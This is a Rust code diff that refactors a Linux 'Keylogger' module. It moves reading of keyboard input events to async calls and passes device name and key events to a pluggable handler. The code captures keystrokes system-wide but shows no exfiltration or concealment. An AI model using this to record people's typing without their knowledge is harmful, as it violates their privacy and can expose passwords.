@@ -1,12 +1,17 @@
+use async_trait::async_trait;
 use std::io;
-use std::os::fd::AsRawFd;
 use std::path::Path;
 use std::sync::Arc;
 
-use crate::device::{find_keyboard_devices, Keyboard};
+use crate::device::{find_keyboard_devices, KeyEvent, Keyboard};
 
+#[async_trait]
 pub trait KeyEventHandler: Send + Sync {
-    fn handle_ev(&self, kb_device: &Path, key: u32);
+    async fn handle_ev(&self, kb_device: &Path, kb_name: &str, ev: Vec<KeyEvent>);
+
+    fn handle_err(&self, err: io::Error) -> io::Result<()> {
+        Err(err)
+    }
 }
 
 pub struct Keylogger {
@@ -29,35 +34,34 @@ impl Keylogger {
 
         for keyboard in self.keyboards {
             let ev_handler = Arc::clone(&self.ev_handler);
-            tokio::spawn(handle_keystrokes(ev_handler, keyboard));
+            tokio::spawn(handle_key_events(ev_handler, keyboard));
         }
 
         Ok(())
     }
 }
 
-async fn handle_keystrokes(ev_handler: Arc<dyn KeyEventHandler>, keyboard: Keyboard) {
-    const MAX_INPUT_EV: usize = 128;
-    let mut input_events = [libc::input_event {
-        time: libc::timeval {
-            tv_sec: 0,
-            tv_usec: 0,
-        },
-        type_: 0,
-        code: 0,
-        value: 0,
-    }; MAX_INPUT_EV];
-
+async fn handle_key_events(
+    ev_handler: Arc<dyn KeyEventHandler>,
+    keyboard: Keyboard,
+) -> io::Result<()> {
+    let keyboard = Arc::new(keyboard);
     loop {
-        let _ = unsafe {
-            libc::read(
-                keyboard.file.as_raw_fd(),
-                input_events.as_mut_ptr() as *mut _,
-                MAX_INPUT_EV,
-            )
+        let ev = match keyboard.read_key_event().await {
+            Ok(ev) => ev,
+            Err(e) => {
+                ev_handler.handle_err(e)?;
+                continue;
+            }
         };
 
-        ev_handler.handle_ev(&keyboard.device, input_events[0].value as u32);
+        if ev.is_empty() {
+            continue;
+        }
+
+        ev_handler
+            .handle_ev(&keyboard.device, &keyboard.name, ev)
+            .await;
     }
 }
 
